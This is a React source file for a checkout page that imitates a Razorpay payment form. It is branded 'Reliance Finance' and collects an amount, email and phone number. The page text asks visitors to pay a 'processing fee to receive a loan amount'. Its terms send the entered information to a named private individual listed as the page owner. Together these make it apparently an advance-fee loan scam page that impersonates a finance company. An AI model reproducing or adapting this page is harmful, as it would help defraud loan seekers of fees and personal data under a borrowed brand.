import React, { useEffect, useState } from "react";

import "./App.css";

const App=() =>{
  const [email, setEmail] = useState();
  const [amount, setAmount] = useState();
  const [phone, setPhone] = useState();
  console.log(email, phone, amount);
  const options = {
    key: "",
    amount: amount*100, //  = INR 1
    name: "Reliance Finance",
    description: "Processing Fees Payment",
    image: "https://cdn.razorpay.com/logos/Imde6ngYNeH41c_large.jpeg",
    handler: function (response) {
      console.log(response, "respone");
      alert("Successfully payment done");
    },
    prefill: {  
      email: email,
    },
    notes: {
      address: "some address",
    },
    theme: {
      color: "#F37254",
      hide_topbar: false,
    },
  };

  const openPayModal = (options) => {
    var rzp1 = new window.Razorpay(options);
    rzp1.open();
  };
  useEffect(() => {
    const script = document.createElement("script");
    script.src = "https://checkout.razorpay.com/v1/checkout.js";
    script.async = true;
    document.body.appendChild(script);
  }, []);
  return (
    <div>
      <div id="desktop-container">
        <div className="content-container">
          <div className="content">
            <div id="header-details">
              <div id="header-logo">
                <img
                  alt="merchant-logo"
                  style={{ width: "158px", height: "77px" }}
                  src="https://cdn.razorpay.com/logos/Imde6ngYNeH41c_large.jpeg"
                />
              </div>
              <div id="merchant-name"></div>
            </div>
            <div data-view-id="1" id="main-view" className="slider-view">
              <div className="title">
                <a
                  slot="before"
                  href="#"
                  className="back-btn"
                  type="button"
                ></a>
                Payment Details
                <div className="title-underline"></div>
              </div>

              <div id="form-section" className="">
                <form
                  className="UI-form "
                  novalidate=""
                  // onSubmit={() => openPayModal(options)}
                >
                  <div>
                    <div>
                      <div className="Field Field--amount Field--currency-1">
                        <div className="Field-label">
                          Amount
                          <div className="text-optional">(Optional)</div>
                        </div>
                        <div className="Field-content">
                          <div className="Field-wrapper">
                            <span className="Field-addon Field-addon--before">
                              <span slot="addonBefore">
                                <b className="currency-symbol">₹</b>
                              </span>
                            </span>
                            <input
                              className="Field-el"
                              type="number"
                              placeholder="Enter Amount"
                              maximum="50000000"
                              inputmode="decimal"
                              value={amount}
                              onChange={(e) => setAmount(e.target.value)}
                            />
                            <span className="Field-addon Field-addon--after">
                              <span
                                slot="addonAfter"
                                style={{ color: "red", fontSize: "12px" }}
                              ></span>
                            </span>
                          </div>
                          <div className="Field-error"></div>
                          <div className="Field-description"></div>
                        </div>
                      </div>
                    </div>
                    <div className="Field Field--required">
                      <div className="Field-label">Email</div>
                      <div className="Field-content">
                        <div className="Field-wrapper">
                          <span className="Field-addon "></span>
                          <input
                            className="Field-el"
                            name="email"
                            required=""
                            value={email}
                            onChange={(e) => setEmail(e.target.value)}
                            type="email"
                          />
                          <span className="Field-addon "></span>
                        </div>
                        <div className="Field-error"></div>
                        <div className="Field-description"></div>
                      </div>
                    </div>
                    <div className="Field Field--required">
                      <div className="Field-label">Phone</div>
                      <div className="Field-content">
                        <div className="Field-wrapper">
                          <span className="Field-addon "></span>
                          <input
                            className="Field-el"
                            name="phone"
                            required=""
                            type="tel"
                            minlength="8"
                            value={phone}
                            onChange={(e) => setPhone(e.target.value)}
                          />
                          <span className="Field-addon "></span>
                        </div>
                        <button
                          style={{
                            marginTop: '18px',
                            background: '#528ff0',
                            color: '#fff',
                            width: '180px',
                            minHeight: '37px',
                            fontSize:' 16px',
                            fontWeight:' bold',
                            lineHeight:' 20px',
                            textAlign:' center',
                            color: '#fff',
                            border:' none'
                          }}
                          type="button"
                          onClick={() => openPayModal(options)}
                        >
                          Pay now{" "}
                          <span style={{ marginLeft: "4px" }}>
                            ₹ {amount || 0.0}
                          </span>
                        </button>

                        <div className="Field-error"></div>
                        <div className="Field-description"></div>
                      </div>
                    </div>
                  </div>
                </form>
              </div>
            </div>
            <div id="details-view" className="">
              <div id="details-section">
                <div id="description-details">
                  <div id="description" className="details-value text-line">
                    <div
                      id="description-quill"
                      className="ql-container ql-snow ql-disabled"
                    >
                      <div
                        className="ql-editor"
                        data-gramm="false"
                        contenteditable="false"
                      >
                        <p>
                          <span style={{ color: "rgb(33, 37, 41)" }}>
                            Kindly make the payment of processing fee to receive
                            a loan amount in your account.
                          </span>
                        </p>
                      </div>
                      <div
                        className="ql-clipboard"
                        contenteditable="true"
                        tabindex="-1"
                      ></div>
                    </div>
                  </div>
                </div>

                <div id="terms-details">
                  <label>Terms &amp; Conditions:</label>
                  <div className="details-value text-wrap">
                    <div className="terms-details-tnc">
                      You agree to share information entered on this page with
                      SURAJ MURMU (owner of this page) and Razorpay, adhering to
                      applicable laws.
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default App;
